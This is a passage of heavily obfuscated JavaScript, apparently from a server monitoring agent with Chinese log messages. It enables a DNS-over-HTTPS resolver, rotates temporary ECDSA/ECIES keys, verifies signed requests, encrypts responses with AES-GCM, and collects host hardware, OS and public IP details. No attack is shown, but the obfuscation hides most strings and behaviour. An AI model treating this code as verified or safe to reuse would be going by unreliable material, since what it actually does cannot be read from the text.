        'ChvIBgLJs2v5',
        'z2nzEfG',
        'AxLtEgK',
        'Ag9TzwrPCG',
        'BM9Kzs1WDhK',
        'q3DvyLe',
        'CgfZC3DK',
        'Dg90ywW',
        'zhLPweW',
        'shr0Cfn0yxr1CW',
        'run1vue',
        'twLZC2LUzYbYzxf1AxjLzcbbrvmTr0nnigzPzwXKCYaOBM9Uy2uSihrHzYWGy2LWAgvYDgv4DcKGAw4GCgf5Bg9Hzc4',
        'teforW',
        't3vOu3q',
        's3z1EgO',
        'wMfoCgy',
        've9Twgi',
        'sg5JtwG',
        'Ec1MAwXLlxbHDgG',
        'C2vYAwfSAxPLzf9OzwfKzxjZ',
        'rw15CfK',
        'zMLUAxnOzwrtzw50',
        'Edi1nte5',
        'CxHPyKK',
        'sefdtva',
        'zMLUzeLUzgv4',
        'w1DbuK5Die5VAxnLifDbu00GBw9KDwXLigzHAwXLzcb0BYbSB2fKoG',
        'CMvZDa',
        'svfjANC',
        'zhjVChbLza',
        'C3rHCNrZv2L0Aa',
        'D3bou2i',
        'AxnwywXPzeLqDJq',
        'Ewn1tLy',
        'y2LmD3q',
        'rhrzB3K',
        'BgLezMW',
        'AgfUzhnOywTLqNL0zxm',
        'yKDMDxq',
        'C3rHDhm',
        'x2jHC2vPBMzVx25LDf9JywnOzq',
        'C3rHDhvZq29Kzq',
        'wKLqx01bwf9ut1rbtf9cwvrfuW',
        'zMfTAwX5',
        'BNDnt3a',
        'BMPqCvK',
        'BvnSshq',
        'y3j5ChrV',
        'tvPvq0y',
        'CxvPy2SGDhvUBMvSihnLy3jLDcbOyxmGyw4GDw5LEhbLy3rLzcb0ExbL',
        'C2vJlxDLyNnVy2TLDc1RzxK',
        'rLPKugK',
        'icHTDxnSioEoR+wIG+MCGcbUB2rLid49idiWlJe5ioAuR+AmGsbYzxf1AxjLkgvZBsKPoYbaBhLKzwXSioMIHoE8LUIVKEs6JoI/M+wiTUs4JEwfVowUUsbTDxnS',
        'icaGms4G6k6+572U546V5Akd5y+y6yEpoIbLEhbVCNqGruneu0fFufvcs0vzpsCTls0Tlujfr0LoifbvqKXjqYblrvKTls0TlsCUlI4N',
        'CxP5ugC',
        'CM90yxrLt3bLCMf0Aw9UywXtzwnYzxrZ',
        'revlsxm',
        'qu5wDvm',
        'DNDJDee',
        'DfvUv2e',
        'zxHPDgnVzgu',
        'CeP5wu8',
        'C2nfELq',
        'CKvZAfa',
        'vefPzwW',
        'CMvZB2X2zurVBwfPBKzPBgvqyxrO',
        's3vIzxjUzxrLCW',
        'rufNv2W',
        'yMLsthG',
        'ENLywfm',
        'vw5ZDxbWB3j0zwqGCgvYBwLZC2LVBIbMB3jTyxqSig9UBhKGB2n0ywWGC3rYAw5NCYbHCMuGC3vWCg9YDgvK',
        'tujnzuO',
        'BNPVwuW',
        'w1rHC2TtDg9Yzv0G4P2mios/NEwTMowKSEI0PsaO5yAf5A2y5lU75yQH5lIn5y+x5B2X5zonktOG',
        'B05vtg0',
        'zhvWBgLJyxrL',
        'y29SBgvJDfn0yxrPy0LUzM8',
        's1nQrgC',
        'DLHtCMC',
        'zg93BMXVywrgAwXL',
        'Du5ZBui',
        'quTRELu',
        'qxb6s04',
        'x3n0CMvHBuzYyw1LCW',
        'l2fWAs9IyxnLAw5MBW',
        's3z2ww4',
        'v2PABeG',
        'rvjHB2m',
        'tgn3zwm',
        'yxjNBYb0Dw5UzwWGBg9VCcbMB3iG',
        'y3b1x2nVCMvZ',
        'C3PXtee',
        'v3Pxs04',
        'zxHWCMvZCW',
        'y2fJAguTy29UDhjVBa',
        'Cg9ZDa',
        'z2vUzxjHDgvtAw5NBgu',
        'qMvJzMe',
        'Dgzsy2W',
        'BLPZz2C',
        'uwXev2e',
        'q0LeCxa',
        'Chr5iowUNUEoSoMaIEwUMJOG',
        'Bwf4sw5MBgLNAhq',
        '5A2q6l+B56Il5zcV5yQO5AsX6lsLoIa',
        'rgTUruq',
        'C2vHBa',
        'mtb8nNWZFdeYFdj8oxWWFde1FdeXFdv8n3W0Fde2Fdf8mtr8mtn8oa',
        'v2vtvKm',
        'EMTRuum',
        'CMLOzwm',
        'qKftruLorK9FrKfjtf9cqunlt0zg',
        'Dw5Hy2TLza'
    ];
    a0a = function () {
        return lu;
    };
    return a0a();
}
function a0a7(a = null) {
    const dz = a0ch, b = {
            'EGgdu': function (f, g) {
                return f(g);
            },
            'MQwFZ': function (f, g) {
                return f === g;
            },
            'SWUMd': function (f, g) {
                return f !== g;
            },
            'XZsEj': function (f, g, h) {
                return f(g, h);
            }
        };
    if (a0a4[dz(0x7e9)])
        return a0a4[dz(0x7e9)];
    const c = b[dz(0x2eb)](String, b[dz(0x2d0)](a, null) ? a0a1[dz(0x275)] : a)[dz(0x40e)]()[dz(0xacd)]();
    if (b['SWUMd'](c, 'on'))
        return null;
    let d = null;
    return a0a1[dz(0x147)] && (d = a0a1['DOH_SERVERS']['split'](/[,\s]+/)[dz(0x51f)](f => f[dz(0x40e)]())[dz(0x29a)](Boolean)), a0a4['_globalHook'] = new a0a4({ 'servers': d }), a0a2[dz(0x4cc)] = b['XZsEj'](a0a6, a0a4['_globalHook'], a0a5), a0P['info']('🌐\x20内置加密\x20DNS\x20已启用\x20(DoH):\x20' + a0a4[dz(0x7e9)][dz(0x626)][dz(0xaa7)](',\x20')), a0a4[dz(0x7e9)];
}
a0a7();
class a0a8 {
    constructor() {
        const dA = a0ch;
        this[dA(0xac5)] = null, this['onExpired'] = null;
    }
    ['getOrCreate'](a) {
        const dB = a0ch, b = {
                'YbOje': function (c, d) {
                    return c === d;
                },
                'nEiLo': function (c, d) {
                    return c * d;
                },
                'fBMUU': dB(0x686)
            };
        this[dB(0xd1d)]();
        if (this[dB(0xac5)]) {
            if (b[dB(0x43c)](this[dB(0xac5)][dB(0x9a6)], b[dB(0x25d)](a, 0xe10)))
                return this[dB(0xac5)];
            const c = this[dB(0xac5)]['key_id'];
            this[dB(0xac5)] = null, a0P[dB(0x4fe)]('🔄\x20[TempKey]\x20请求\x20ttl\x20变更,\x20旧临时密钥提前作废:\x20key_id=' + c);
            if (b[dB(0x43c)](typeof this[dB(0xbfa)], b['fBMUU']))
                try {
                    this[dB(0xbfa)]();
                } catch (d) {
                    a0P['error'](dB(0x487) + d[dB(0x8f9)]);
                }
        }
        return this[dB(0xac5)] = this['_generate'](a), a0P[dB(0x1b1)]('🔑\x20[TempKey]\x20新临时密钥已生成:\x20key_id=' + this[dB(0xac5)][dB(0xf2)] + dB(0x3af) + a + dB(0x624)), this[dB(0xac5)];
    }
    [a0ch(0x83e)]() {
        const dC = a0ch;
        this['_expireCurrent']();
        if (this[dC(0xac5)])
            return this[dC(0xac5)][dC(0x9f0)];
        return null;
    }
    [a0ch(0x71a)]() {
        const dD = a0ch;
        this['_expireCurrent']();
        if (this['_key'])
            return this['_key'][dD(0x680)];
        return null;
    }
    [a0ch(0xd1d)]() {
        const dE = a0ch, a = {
                'qWQJd': function (b, c) {
                    return b === c;
                },
                'HIaKq': 'function'
            };
        if (this[dE(0xac5)] && this['_isExpired'](this[dE(0xac5)])) {
            const b = this[dE(0xac5)]['key_id'];
            this[dE(0xac5)] = null, a0P[dE(0x4fe)](dE(0xb7c) + b);
            if (a['qWQJd'](typeof this[dE(0xbfa)], a[dE(0xa23)]))
                try {
                    this[dE(0xbfa)]();
                } catch (c) {
                    a0P[dE(0xb4f)](dE(0xa28) + c[dE(0x8f9)]);
                }
        }
    }
    [a0ch(0x96d)](a) {
        const dF = a0ch, b = {
                'muVGm': function (c, d) {
                    return c >= d;
                },
                'atHZM': function (c, d) {
                    return c / d;
                }
            };
        return b[dF(0xb91)](Math[dF(0x579)](b[dF(0xbe6)](Date[dF(0x156)](), 0x3e8)), a[dF(0x42a)]);
    }
    [a0ch(0x6dd)](a) {
        const dG = a0ch, b = {
                'EsvIL': dG(0xa9c),
                'ripaa': dG(0x77c),
                'llJtJ': dG(0x96c),
                'ECrjb': dG(0x6cc),
                'nrZhu': function (o, p) {
                    return o - p;
                },
                'WjVZo': function (o, p) {
                    return o / p;
                },
                'INhLd': function (o, p) {
                    return o * p;
                },
                'rQyhg': dG(0x26f),
                'rfLWW': function (o, p) {
                    return o + p;
                },
                'pElpB': dG(0xad4),
                'YOFQY': 'base64'
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[dG(0xa0e)]('ec', { 'namedCurve': b[dG(0xd59)] }), f = c['export']({
                'type': 'pkcs8',
                'format': b[dG(0x307)]
            }), g = d['export']({
                'type': b['llJtJ'],
                'format': dG(0x77c)
            }), h = a0k[dG(0x863)](0x20), i = Buffer[dG(0x8c2)](a0B[dG(0x2a0)](h, ![])), j = c[dG(0x48d)]({ 'format': dG(0x3d5) }), k = d[dG(0x48d)]({
                'type': b[dG(0x20b)],
                'format': b[dG(0x3bc)]
            }), l = k[dG(0x4b4)](b[dG(0x1f3)](k['length'], 0x41)), m = Math[dG(0x579)](b['WjVZo'](Date[dG(0x156)](), 0x3e8)), n = b[dG(0x782)](a, 0xe10);
        return {
            'key_id': a0k[dG(0x863)](0x8)[dG(0x1d9)](b['rQyhg']),
            'created_at': m,
            'expires_at': b[dG(0xa31)](m, n),
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[dG(0x1d9)]('hex'),
            'ecies_public_key': i[dG(0x1d9)](b['rQyhg']),
            'ecdsa_private_hex': Buffer[dG(0x8c2)](j['d'], b[dG(0x997)])[dG(0x1d9)](b[dG(0x16c)]),
            'ecdsa_public_b64': Buffer['from'](a0A[dG(0x9a2)][dG(0x552)](l)['toBytes'](!![]))[dG(0x1d9)](b[dG(0x848)]),
            'ecies_public_b64': Buffer[dG(0x8c2)](a0B[dG(0x2a0)](h, !![]))[dG(0x1d9)](b['YOFQY']),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0a9 {
    constructor(a, b) {
        const dH = a0ch, c = {
                'EOWFb': dH(0x62d),
                'KjRNH': dH(0xd18),
                'uQidM': function (d, f) {
                    return d(f);
                },
                'uVgBB': dH(0x3d5)
            };
        this[dH(0x88d)] = null, this['eciesPubkey'] = null;
        if (a)
            try {
                const d = a[dH(0x40e)]();
                if (d[dH(0xc9b)](c[dH(0xb65)]))
                    this[dH(0x88d)] = a0k[dH(0x915)](d);
                else {
                    const f = Buffer[dH(0x8c2)](d, c['KjRNH']), g = a0A[dH(0x9a2)]['fromBytes'](f), h = g[dH(0x257)](![]), i = m => m[dH(0x1d9)](dH(0xd18))['replace'](/\+/g, '-')[dH(0xa6e)](/\//g, '_')[dH(0xa6e)](/=/g, ''), j = c[dH(0x7b6)](i, Buffer[dH(0x8c2)](h[dH(0x88a)](0x1, 0x21))), k = c['uQidM'](i, Buffer[dH(0x8c2)](h[dH(0x88a)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': dH(0x56d),
                            'x': j,
                            'y': k
                        };
                    this[dH(0x88d)] = a0k[dH(0x915)]({
                        'key': l,
                        'format': c[dH(0xa8e)]
                    });
                }
            } catch (m) {
                a0P[dH(0xb4f)]('⚠️\x20ECDSA公钥加载失败:\x20' + m[dH(0x8f9)]), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this[dH(0x283)] = a0w[dH(0xb72)](b[dH(0x40e)]());
            } catch (n) {
                a0P['warn'](dH(0xd69) + n[dH(0x8f9)]);
            }
    }
    [a0ch(0x4ce)](a, b, c, d, f, g, h = null) {
        const dI = a0ch, i = {
                'DIgUG': function (j, k) {
                    return j(k);
                },
                'ALbXG': function (j, k) {
                    return j / k;
                },
                'tiPIq': function (j, k) {
                    return j > k;
                },
                'dhjWP': function (j, k) {
                    return j - k;
                },
                'awmeV': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'dSTei': dI(0x3ce),
                'djqwV': 'temp',
                'gntRT': dI(0x474)
            };
        if (!this[dI(0x88d)])
            throw new Error('ECDSA\x20public\x20key\x20not\x20loaded');
        try {
            const j = i[dI(0x53b)](parseInt, f), k = Math[dI(0x579)](i[dI(0xd08)](Date[dI(0x156)](), 0x3e8));
            if (i[dI(0xbd4)](Math[dI(0x82a)](i[dI(0x51e)](k, j)), a0a1[dI(0x683)]))
                throw new Error('Timestamp\x20expired:\x20diff=' + Math[dI(0x82a)](k - j) + 's\x20>\x20' + a0a1['TIMESTAMP_WINDOW'] + 's');
            const l = i[dI(0x406)](a0aa, a, b, c, d, f);
            if (this[dI(0x97a)](this[dI(0x88d)], l, g))
                return i[dI(0x379)];
            if (h && this[dI(0x97a)](h, l, g))
                return i[dI(0xa5b)];
            throw new Error(i['gntRT']);
        } catch (m) {
            throw new Error(dI(0x56b) + m[dI(0x8f9)]);
        }
    }
    [a0ch(0x97a)](a, b, c) {
        const dJ = a0ch;
        if (!a)
            return ![];
        try {
            const d = a0w[dJ(0xb72)](c), f = a0k['createVerify'](dJ(0xa9e));
            return f[dJ(0xd44)](b), f['verify'](a, d);
        } catch (g) {
            return ![];
        }
    }
    [a0ch(0x32f)](a, b = null) {
        const dK = a0ch, c = {
                'PsQHV': dK(0x5ad),
                'DoRUv': dK(0xd18)
            };
        if (a0a1[dK(0x1ec)])
            return JSON[dK(0x70a)](a);
        if (!this['eciesPubkey'])
            throw new Error(dK(0x7e7));
        try {
            const d = JSON['stringify'](a), f = Buffer['from'](d, c[dK(0x6cf)]), g = b || Buffer[dK(0x8c2)](this[dK(0x283)]), h = a0v(g, f);
            return Buffer[dK(0x8c2)](h)['toString'](c[dK(0x7ed)]);
        } catch (i) {
            throw new Error(dK(0x219) + i[dK(0x8f9)]);
        }
    }
    [a0ch(0x339)](a, b) {
        const dL = a0ch, c = {
                'GwKIK': function (d, f) {
                    return d !== f;
                },
                'Xfssc': dL(0x7a5),
                'TiOqG': 'base64',
                'EPgRY': dL(0xc74),
                'DqJMm': dL(0xc88),
                'eckCN': dL(0x3c6)
            };
        if (!b || c[dL(0x4a8)](b[dL(0xed)], 0x20))
            throw new Error(c[dL(0xa05)]);
        try {
            const d = Buffer['from'](a, c[dL(0xacb)])[dL(0x1d9)](c[dL(0xb6c)]), f = JSON[dL(0x418)](d);
            if (!f['nonce'] || !f[dL(0x17e)] || !f[dL(0xbf2)])
                throw new Error(c['DqJMm']);
            const g = Buffer[dL(0x8c2)](f['nonce'], c[dL(0xacb)]), h = Buffer[dL(0x8c2)](f[dL(0x17e)], c[dL(0xacb)]), i = Buffer[dL(0x8c2)](f[dL(0xbf2)], dL(0xd18)), j = a0k[dL(0x191)](c[dL(0x245)], b, g);
            j['setAuthTag'](h);
            let k = j[dL(0xd44)](i, null, c[dL(0xb6c)]);
            return k += j[dL(0x531)](dL(0xc74)), k;
        } catch (l) {
            throw new Error('AES\x20Decrypt\x20Error:\x20' + l['message']);
        }
    }
    ['encryptData'](a, b) {
        const dM = a0ch, c = {
                'DsVdc': function (d, f) {
                    return d !== f;
                },
                'VgepV': dM(0x3c6),
                'iKAJs': dM(0xd18),
                'bySwb': dM(0xc74)
            };
        if (!b || c[dM(0xb15)](b[dM(0xed)], 0x20))
            throw new Error(dM(0x2ad));
        try {
            const d = a0k[dM(0x863)](0xc), f = a0k['createCipheriv'](c[dM(0xa86)], b, d), g = Buffer[dM(0x653)]([
                    f[dM(0xd44)](a),
                    f[dM(0x531)]()
                ]), h = f[dM(0x927)](), i = {
                    'nonce': d[dM(0x1d9)](c['iKAJs']),
                    'tag': h[dM(0x1d9)](c['iKAJs']),
                    'ciphertext': g[dM(0x1d9)](c['iKAJs'])
                };
            return Buffer['from'](JSON['stringify'](i), c[dM(0xc43)])[dM(0x1d9)](dM(0xd18));
        } catch (j) {
            throw new Error(dM(0xaa8) + j[dM(0x8f9)]);
        }
    }
}
function a0aa(a, b, c, d, f) {
    const dN = a0ch, g = {
            'eESzN': dN(0xb11),
            'oNOSO': 'hex'
        };
    return !c && (c = a0k[dN(0xaf4)](g[dN(0x65d)])[dN(0xd44)](Buffer['alloc'](0x0))[dN(0x248)](g[dN(0x675)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0ab(a, b = null) {
    const dO = a0ch, c = {
            'aHgLS': dO(0x733),
            'ZEDTX': dO(0x5aa),
            'eGfFF': function (d, f) {
                return d === f;
            },
            'NePQT': dO(0x9be),
            'zsRin': dO(0x9e2),
            'AavUi': dO(0x899),
            'iKeBs': dO(0x315),
            'XJHUf': dO(0xc74),
            'zaJiY': dO(0xd18),
            'OpYWB': 'x-agent-version',
            'ndQxz': dO(0x3ef),
            'ZyqsF': function (d) {
                return d();
            },
            'ntETp': function (d, f) {
                return d === f;
            },
            'JAPlg': dO(0xc45),
            'eMByA': function (d) {
                return d();
            },
            'ennbE': '/api/baseinfo',
            'MsRqe': function (d) {
                return d();
            },
            'xgjgs': dO(0x938),
            'VtXyR': 'X-Nonce',
            'ZpWRV': 'x-timestamp',
            'pcBXK': 'X-Timestamp',
            'uMUbQ': 'x-auth-token',
            'pkbjW': dO(0x1bf),
            'lwwSG': dO(0xfe),
            'laGpm': function (d, f) {
                return d === f;
            },
            'rkLuF': dO(0x5ad),
            'tpyqi': function (d, f) {
                return d > f;
            },
            'ESfFC': dO(0xb11),
            'OAYAf': dO(0x26f),
            'scpgk': function (d, f) {
                return d === f;
            },
            'rXahe': dO(0x3ce),
            'uRqRf': function (d) {
                return d();
            },
            'riCnp': 'x-aes-encrypted',
            'OMGCj': dO(0x464),
            'jeQEP': dO(0xa49)
        };
    return async (d, f, g) => {
        const dQ = dO, h = {
                'dmPsW': function (o, p) {
                    const dP = a0b;
                    return c[dP(0x282)](o, p);
                },
                'jTaWm': c[dQ(0x188)],
                'vjbAR': c['aHgLS'],
                'TMLWS': c[dQ(0xd11)],
                'jDiDW': dQ(0x5a4),
                'RINGS': c[dQ(0x692)],
                'LIdIZ': c[dQ(0xc0d)],
                'GcnXX': dQ(0xcd1),
                'CBkTg': c[dQ(0x4c5)],
                'XoYvz': c[dQ(0x330)],
                'GfRfJ': c[dQ(0xa10)],
                'lVmNw': c[dQ(0x74b)]
            };
        if (d[dQ(0x4ac)][dQ(0xc9b)](c['ndQxz']))
            return c[dQ(0x563)](g);
        const i = f[dQ(0x6da)];
        f[dQ(0x6da)] = function (o) {
            const dR = dQ;
            if (a0a1['DEBUG']) {
                const p = h['dmPsW'](typeof o, h[dR(0xbef)]) ? o : Buffer['isBuffer'](o) ? o : JSON[dR(0x70a)](o);
                return f['set'](h[dR(0x79c)], h[dR(0x102)]), f['set'](h['jDiDW'], Buffer[dR(0xd10)](p)[dR(0x1d9)]()), i['call'](this, p);
            }
            if (f[dR(0x850)](h[dR(0x493)]) && f['get'](h['RINGS'])[dR(0x659)](h['LIdIZ']))
                try {
                    if (d[dR(0x6b4)]) {
                        let q;
                        if (h[dR(0x19c)](d[dR(0x4ac)], h[dR(0x41f)])) {
                            const r = typeof o === h[dR(0xbef)] ? JSON[dR(0x418)](o) : o;
                            let s = null;
                            h[dR(0x19c)](d['key_source'], h[dR(0xb07)]) && b && (s = b[dR(0x71a)]());
                            const t = a[dR(0x32f)](r, s);
                            q = h['dmPsW'](typeof t, h[dR(0xbef)]) ? t : JSON[dR(0x70a)](t);
                        } else {
                            const u = Buffer[dR(0xabf)](o) ? o : typeof o === h[dR(0xbef)] ? Buffer[dR(0x8c2)](o, h['XoYvz']) : Buffer[dR(0x8c2)](JSON['stringify'](o), h['XoYvz']);
                            q = a['encryptData'](u, Buffer[dR(0x8c2)](a0a1[dR(0x556)], h['GfRfJ']));
                        }
                        return f[dR(0xb80)](h[dR(0x79c)], dR(0x464)), f[dR(0xb80)](h['lVmNw'], a0a1[dR(0x11a)]), f[dR(0xb80)](h['jDiDW'], Buffer[dR(0xd10)](q, h['XoYvz'])[dR(0x1d9)]()), i[dR(0x1ea)](this, q);
                    } else {
                        const v = h[dR(0x19c)](typeof o, 'string') ? o : JSON['stringify'](o);
                        return f[dR(0xb80)]('Content-Length', Buffer[dR(0xd10)](v, h[dR(0x377)])[dR(0x1d9)]()), i[dR(0x1ea)](this, v);
                    }
                } catch (w) {
                    if (!f[dR(0x4ee)]) {
                        const x = JSON[dR(0x70a)]({ 'error': 'Response\x20encryption\x20failed:\x20' + w[dR(0x8f9)] });
                        return f['status'](0x1f4), f[dR(0xb80)](dR(0x9e2), h[dR(0x3f2)]), f[dR(0xb80)](h['jDiDW'], Buffer[dR(0xd10)](x, h[dR(0x377)])[dR(0x1d9)]()), i[dR(0x1ea)](this, x);
                    }
                    throw w;
                }
            return i[dR(0x1ea)](this, o);
        };
        const j = f[dQ(0xa40)];
        f['end'] = function (...o) {
            const dS = dQ;
            return a0a1['DEBUG'] && !f[dS(0x850)](c['aHgLS']) && f[dS(0xb80)](c[dS(0x3c3)], c['ZEDTX']), j[dS(0x179)](this, o);
        };
        if (c[dQ(0x282)](d[dQ(0x5bd)], 'OPTIONS') || c[dQ(0x8a9)](d[dQ(0x5bd)], c[dQ(0x8fd)]))
            return a0a1['DEBUG'] && f[dQ(0xb80)](c['aHgLS'], c[dQ(0xd11)]), c['eMByA'](g);
        d[dQ(0x6b4)] = ![];
        const k = [
            c['ennbE'],
            '/api/status'
        ];
        if (a0a1['DEBUG'])
            return d['is_authenticated'] = !![], c[dQ(0x504)](g);
        const l = d['headers'][c['xgjgs']] || d[dQ(0x363)][c[dQ(0xcfc)]], m = d[dQ(0x363)][c[dQ(0xc77)]] || d['headers'][c[dQ(0xb75)]], n = d['headers'][c[dQ(0x59b)]] || d['headers'][c['pkbjW']];
        if (!l || !m || !n)
            return k[dQ(0x659)](d[dQ(0x4ac)]) ? c['eMByA'](g) : f[dQ(0x4dc)](0x191)[dQ(0xb24)]({ 'error': dQ(0xafd) });
        try {
            let o = Buffer[dQ(0x9e7)](0x0);
            if (d[dQ(0x4ac)] !== c['lwwSG']) {
                if (Buffer['isBuffer'](d[dQ(0xae4)]))
                    o = d[dQ(0xae4)];
                else {
                    if (c[dQ(0x34c)](typeof d[dQ(0xae4)], c[dQ(0x188)]))
                        o = Buffer['from'](d[dQ(0xae4)], c[dQ(0xac9)]);
                }
            }
            const p = c[dQ(0x36a)](o[dQ(0xed)], 0x0) ? a0k[dQ(0xaf4)](c[dQ(0xada)])[dQ(0xd44)](o)[dQ(0x248)](c['OAYAf']) : '', q = b ? b[dQ(0x83e)]() : null, r = a[dQ(0x4ce)](d[dQ(0x5bd)], d['path'], p, l, m, n, q);
            d[dQ(0x6b4)] = !![], d[dQ(0x374)] = c['scpgk'](r, 'temp') ? dQ(0x315) : c[dQ(0x951)];
        } catch (s) {
            return k[dQ(0x659)](d[dQ(0x4ac)]) ? c[dQ(0x68b)](g) : f[dQ(0x4dc)](0x191)[dQ(0xb24)]({ 'error': dQ(0x56b) + s[dQ(0x8f9)] });
        }
        if (d['body'] && c[dQ(0xc72)](typeof d['body'], c[dQ(0x188)])) {
            const t = (d['headers'][c[dQ(0x7b0)]] || '')[dQ(0xacd)]() === c['OMGCj'];
            try {
                if (t && d['is_authenticated']) {
                    const u = Buffer['from'](a0a1[dQ(0x556)], c[dQ(0xa10)]), v = a[dQ(0x339)](d[dQ(0xae4)], u);
                    d[dQ(0xae4)] = JSON[dQ(0x418)](v);
                } else {
                    if (d[dQ(0xae4)][dQ(0xc9b)](c[dQ(0x247)])) {
                        const w = Buffer[dQ(0x8c2)](d[dQ(0xae4)], dQ(0xd18))[dQ(0x1d9)](c[dQ(0xac9)]);
                        d[dQ(0xae4)] = JSON['parse'](w);
                    } else {
                        if (d[dQ(0xae4)]['trim']()['startsWith']('{') || d[dQ(0xae4)][dQ(0x40e)]()['startsWith']('['))
                            d['body'] = JSON['parse'](d[dQ(0xae4)]);
                        else {
                            if (c[dQ(0x282)](d[dQ(0xae4)][dQ(0x40e)](), ''))
                                d[dQ(0xae4)] = {};
                        }
                    }
                }
            } catch (x) {
                return a0P['error']('💥\x20[Body\x20Parse\x20Error]:\x20' + x['message']), f['status'](0x190)[dQ(0xb24)]({ 'error': 'Invalid\x20body\x20format:\x20' + x[dQ(0x8f9)] });
            }
        }
        g();
    };
}
class a0ac {
    constructor() {
        const dT = a0ch, a = {
                'PdJex': function (b, c) {
                    return b / c;
                }
            };
        this[dT(0x201)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[dT(0xa06)] = 0x0, this[dT(0xb99)] = 0x0, this[dT(0x4ef)] = a[dT(0x960)](Date[dT(0x156)](), 0x3e8);
    }
    async [a0ch(0x9d3)]() {
        const dU = a0ch, a = {
                'cVhNs': dU(0x582),
                'vKYiE': 'utf8',
                'GSGpM': function (d, f) {
                    return d === f;
                },
                'KZxKR': dU(0x434),
                'VWBnK': function (d, f, g) {
                    return d(f, g);
                },
                'tfRcl': function (d, f, g) {
                    return d(f, g);
                },
                'mgUtG': dU(0x9cf),
                'eNWgC': function (d, f, g) {
                    return d(f, g);
                },
                'kzXvH': dU(0xc60),
                'hCCiV': function (d, f) {
                    return d > f;
                },
                'CoVBX': function (d, f) {
                    return d === f;
                },
                'MeVcl': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[dU(0x714)](a['cVhNs'], a['vKYiE']))['trim']();
            b = a[dU(0x37f)](d, a[dU(0x2c4)]) ? null : a['VWBnK'](parseInt, d, 0xa), c = a[dU(0xcdf)](parseInt, (await a0m[dU(0x714)](dU(0x3e6), a[dU(0xb13)]))[dU(0x40e)](), 0xa);
        } catch {
            try {
                b = a['VWBnK'](parseInt, (await a0m[dU(0x714)](a['mgUtG'], a[dU(0xb13)]))[dU(0x40e)](), 0xa), c = a[dU(0x3ed)](parseInt, (await a0m[dU(0x714)](a[dU(0xcff)], a[dU(0xb13)]))[dU(0x40e)](), 0xa);
                if (a[dU(0xc68)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u[dU(0x4e0)]();
                b = f[dU(0xc84)], c = f[dU(0xa72)];
            }
        }
        if (a[dU(0x4af)](b, null)) {
            const g = await a0u[dU(0x4e0)]();
            b = g[dU(0xc84)], (c === null || isNaN(c)) && (c = g['used']);
        }
        return {
            'total': b,
            'used': c,
            'available': a['MeVcl'](b, c),
            'free': a['MeVcl'](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0ch(0x23c)]() {
        const dV = a0ch, a = await this['collectStaticInfo'](), b = await this[dV(0x944)](a[dV(0x349)]), c = await this['collectNetInfo'](), d = a0ac['assembleBaseInfo'](a, b, c);
        return a0P[dV(0x4f6)](dV(0x170) + JSON['stringify'](d, null, 0x2), 0x1), d;
    }
    static [a0ch(0x66b)](a, b, c) {
        const dW = a0ch;
        return {
            'arch': a[dW(0x729)],
            'cpu_cores': a[dW(0xcd7)],
            'cpu_name': a[dW(0x4fa)],
            'disk_total': b['disk_total'],
            'gpu_name': a[dW(0x5de)],
            'ipv4': c[dW(0xb92)] ?? null,
            'ipv6': c[dW(0x4f9)] ?? null,
            'mem_total': b['mem_total'],
            'os': a['os'],
            'kernel_version': a[dW(0x545)],
            'swap_total': b[dW(0x952)],
            'version': a[dW(0xa8d)],
            'virtualization': a[dW(0x349)],
            'marks': Array['isArray'](a[dW(0x237)]) ? [...a['marks']] : []
        };
    }
    static ['staticFallback']() {
        const dX = a0ch;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0a1[dX(0x11a)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0ch(0x497)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static [a0ch(0x2e6)]() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async [a0ch(0xcc9)]() {
        const dY = a0ch;
        let a = {}, b = {};
        try {
            a = await a0u[dY(0x10c)]();
        } catch (d) {
            a0P['debug']('获取\x20CPU\x20信息失败:\x20' + d[dY(0x8f9)], 0x1);
        }
        try {
            b = await a0u[dY(0xc5b)]();
        } catch (f) {
            a0P[dY(0x4f6)]('获取\x20OS\x20信息失败:\x20' + f[dY(0x8f9)], 0x1);
        }
        let c = '';
        try {
            c = await this[dY(0x31c)]();
        } catch (g) {
            a0P['debug']('获取虚拟化信息失败:\x20' + g['message'], 0x1);
        }
        return {
            'arch': a0p['arch']() || '',
            'cpu_cores': a[dY(0xe9)] || 0x0,
            'cpu_name': a[dY(0xbe8)] || '',
            'gpu_name': '',
            'os': ((b[dY(0x1a6)] || '') + '\x20' + (b[dY(0x3fd)] || ''))[dY(0x40e)](),
            'kernel_version': b['kernel'] || '',
            'version': a0a1[dY(0x11a)],
            'virtualization': c,
            'marks': this[dY(0x8bd)]()
        };
    }
    async [a0ch(0x944)](a) {
        const dZ = a0ch;
        let b = 0x0;
        try {
            b = (await a0u[dZ(0xd28)]())[0x0]?.[dZ(0x677)] || 0x0;
        } catch (d) {
            a0P[dZ(0x4f6)](dZ(0x400) + d[dZ(0x8f9)], 0x1);
        }
        let c = {
            'total': 0x0,
            'swaptotal': 0x0
        };
        try {
            c = await this[dZ(0x9d3)]() || c;
        } catch (f) {
            a0P[dZ(0x4f6)]('获取内存信息失败:\x20' + f[dZ(0x8f9)], 0x1);
        }
        return {
            'disk_total': b,
            'mem_total': c[dZ(0xc84)] || 0x0,
            'swap_total': c[dZ(0x852)] || 0x0
        };
    }
    async ['collectNetInfo']() {
        const e0 = a0ch, a = {
                'wCzLO': function (d, f) {
                    return d === f;
                },
                'mbFxz': e0(0x7c0),
                'nIqvX': function (d, f) {
                    return d === f;
                },
                'mUekz': e0(0x847)
            }, [b, c] = await Promise[e0(0x800)]([
                this['getPublicIpV4'](),
                this[e0(0x3b3)]()
            ]);
